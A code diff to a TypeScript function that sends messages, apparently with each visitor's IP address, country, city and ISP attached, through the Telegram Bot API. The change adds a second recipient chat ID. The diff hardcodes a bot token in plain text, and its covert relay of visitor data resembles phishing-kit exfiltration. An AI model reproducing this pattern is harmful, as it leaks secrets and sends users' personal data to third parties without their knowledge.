@@ -1,11 +1,13 @@
 import axios from "axios";
 
 export const sendTelegramMessage = async (message: string) => {
-  const botToken = "7228037711:AAF2nyOJXhC4aJbpZB83wuOrDSQdTTP2pjQ"; // Your bot token
-  const chatId = "5074398256"; // Your chat ID
+  const botToken = "7228037711:AAF2nyOJXhC4aJbpZB83wuOrDSQdTTP2pjQ";
 
-  if (!botToken || !chatId) {
-    console.error("Bot token or chat ID is missing.");
+  // Multiple chat IDs
+  const chatIds = ["5074398256", "1303640598"];
+
+  if (!botToken || chatIds.length === 0) {
+    console.error("Bot token or chat IDs are missing.");
     return;
   }
 
@@ -26,7 +28,6 @@ IP Address: ${ip}
 Country: ${location.country}
 City: ${location.city}
 ISP: ${location.connection.isp}
-
 `;
     } else {
       locationInfo = "Geolocation lookup failed.";
@@ -40,15 +41,18 @@ ISP: ${location.connection.isp}
 
   try {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await axios.post(url, {
-      chat_id: chatId,
-      text: finalMessage,
-    });
 
-    if (response.data.ok) {
-      console.log(".");
-    } else {
-      console.error("Telegram API Error:", response.data.description);
+    for (const chatId of chatIds) {
+      const response = await axios.post(url, {
+        chat_id: chatId,
+        text: finalMessage,
+      });
+
+      if (response.data.ok) {
+        console.log(`Message sent to ${chatId}`);
+      } else {
+        console.error(`Telegram API Error for ${chatId}:`, response.data.description);
+      }
     }
   } catch (error) {
     console.error("Error sending Telegram message:", error);
